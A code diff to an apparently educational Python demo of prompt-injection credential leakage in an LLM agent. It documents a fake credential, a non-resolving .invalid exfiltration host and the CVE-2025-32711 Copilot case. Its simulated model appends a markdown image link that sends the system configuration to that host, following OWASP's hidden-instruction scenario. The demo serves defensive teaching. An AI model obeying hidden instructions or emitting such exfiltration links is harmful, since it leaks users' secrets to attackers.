@@ -13,6 +13,12 @@ Why it is safe to run
 1. The credential is fake. `DEMO_CREDENTIAL` uses an invented `demo_live_`
    prefix that belongs to no real provider and says NOT_A_REAL_CREDENTIAL in
    the middle of the string. It authenticates against nothing.
+
+   One exception, stated because a guide about leaking credentials must not
+   have a run mode that prints a live one: `leaky_agent.py` substitutes
+   `TOKEN_LEAKAGE_DEMO_FAKE_KEY` from the environment if you set it. Setting it
+   to a real credential prints that credential to stdout three times. The name
+   is deliberately unusable for anything else; do not point it at a real key.
 2. The exfiltration destination cannot resolve. `EXFIL_HOST` sits under
    `.invalid`, the top-level domain RFC 2606 reserves for names that are "sure
    to be invalid". Even a bug that reached the network would fail to resolve.
@@ -46,9 +52,14 @@ that bound, so its safety depends on model behaviour. `brokered_agent.py` does
 not, so its output is safe whatever the model does — which is the only kind of
 safety you can verify without running the model a million times.
 
-The unscripted version of this exact flow is real. CVE-2025-32711 is recorded
-by NVD as "Ai command injection in M365 Copilot allows an unauthorized attacker
-to disclose information over a network", scored CVSS 3.1 9.3.
+Injection against a shipped product, ending in disclosure over the network, is
+recorded rather than hypothetical: NVD describes CVE-2025-32711 as "Ai command
+injection in M365 Copilot allows an unauthorized attacker to disclose
+information over a network". It carries two CVSS 3.1 base scores — 9.3 critical
+from Microsoft as the assigning CNA, and 7.5 high from NVD's own analysis. NVD
+does not describe the delivery mechanism, so do not read that record as the
+source for the image-link step below; that comes from OWASP LLM01:2025
+scenario #2.
 """
 
 from __future__ import annotations
@@ -117,8 +128,9 @@ def respond(messages: list[dict[str, str]]) -> str:
         # is reachable by the output; this is that fact, spelled out.
         parts.append(f"configuration:\n{system}")
     if _asks_for_status_link(context):
-        # OWASP LLM01:2025 scenario #2: hidden instructions cause the model to
-        # insert an image link, and the fetch of that image is the exfiltration.
+        # OWASP LLM01:2025 scenario #2 is the source for this mechanism: hidden
+        # instructions cause the model to insert an image linking to a URL, and
+        # the fetch of that image is the exfiltration.
         parts.append(f"![ok]({EXFIL_HOST}?cfg={_urlish(system)})")
     return "\n\n".join(parts)
 
